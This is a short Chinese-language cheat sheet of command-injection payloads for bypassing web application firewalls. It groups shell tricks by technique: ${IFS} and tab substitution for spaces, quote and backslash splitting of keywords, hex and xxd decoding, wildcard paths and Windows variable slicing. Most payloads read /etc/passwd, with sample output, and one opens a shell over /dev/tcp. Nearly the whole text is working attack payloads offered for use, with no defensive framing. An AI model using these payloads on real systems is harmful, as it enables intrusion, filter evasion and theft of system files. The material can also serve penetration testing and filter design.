# 命令注入WAF绕过

## 空格绕过

```bash
cat${IFS}/etc/passwd
ls${IFS}-la
{cat,/etc/passwd}
cat</etc/passwd
sh</dev/tcp/127.0.0.1/4242
X=$'uname\x20-a'&&$X
;ls%09-al%09/home
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```

## 换行符绕过

```bash
original_cmd_by_server
ls
```

## 反斜杠换行绕过

```bash
$ cat /et\
c/pa\
sswd
```

URL编码形式如下:
```bash
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

## 十六进制编码

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

## 斜杠绕过

```bash
echo ${HOME:0:1}
/

cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

echo . | tr '!-0' '"-1'
/

tr '!-0' '"-1' <<< .
/

cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

## 关键字绕过

```bash
w'h'o'am'i
wh''oami

w"h"o"am"i
wh""oami

wh``oami

w\ho\am\i
/\b\i\n/////s\h

who$@ami
echo whoami|$0

who$()ami
who$(echo am)i
who`echo am`i

/???/??t /???/p??s??
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}

powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```
